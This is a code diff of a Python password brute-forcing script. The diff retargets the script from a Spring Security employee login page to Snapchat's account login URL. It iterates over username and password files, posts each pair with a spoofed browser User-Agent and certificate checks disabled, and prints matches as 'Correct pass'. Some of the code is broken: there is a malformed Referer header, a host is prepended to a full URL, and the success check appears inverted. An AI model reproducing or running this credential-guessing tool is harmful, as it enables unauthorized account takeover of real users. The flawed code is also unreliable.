@@ -20,8 +20,8 @@ class ClassName():
             cookies = dict(JSESSIONID=cookie1)
             c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer:' + config["HOST"] + 'https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome', 'Accept-Language': 'en-US,en;q=0.5'})
             c.cookies.clear()
-            cpost = c.post(config["HOST"] + '/employee/j_spring_security_check', cookies=cookies, data=payload, allow_redirects=True, verify=False)
-            m = re.search('You are unauthorized to access this page.', cpost.text)
+            cpost = c.post(config["HOST"] + 'https://accounts.snapchat.com/accounts/login?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome', cookies=cookies, data=payload, allow_redirects=True, verify=False)
+            m = re.search('Cannot find the user.', cpost.text)
             if m:
                 print("[+]  Correct pass: " + config["USERNAME"] + ":" + config["PASSWORD"])
                 if not config["dry_run"]:
@@ -45,15 +45,15 @@ class ClassName():
                         config["USERNAME"] = line.strip('\n')
                         config["PASSWORD"] = pass_line.strip('\n')
                         payload = {
-                            'j_username': config["USERNAME"],
-                            'j_password': config["PASSWORD"]
+                            'username': config["USERNAME"],
+                            'password': config["PASSWORD"]
                             }
                         self.connectTest(config, payload)
                 else:
                     config["PASSWORD"] = pass_line.strip('\n')
                     payload = {
-                        'j_username': config["USERNAME"],
-                        'j_password': config["PASSWORD"]
+                        'username': config["USERNAME"],
+                        'password': config["PASSWORD"]
                         }
                     self.connectTest(config, payload)
         elif config["UserFile"]:
@@ -61,12 +61,12 @@ class ClassName():
             for line in lines:
                 config["USERNAME"] = line.strip('\n')
                 payload = {
-                    'j_username': config["USERNAME"],
-                    'j_password': config["PASSWORD"]
+                    'username': config["USERNAME"],
+                    'password': config["PASSWORD"]
                     }
                 self.connectTest(config, payload)
         else:
             payload = {
-                'j_username': config["USERNAME"],
-                'j_password': config["PASSWORD"]
+                'username': config["USERNAME"],
+                'password': config["PASSWORD"]
             }
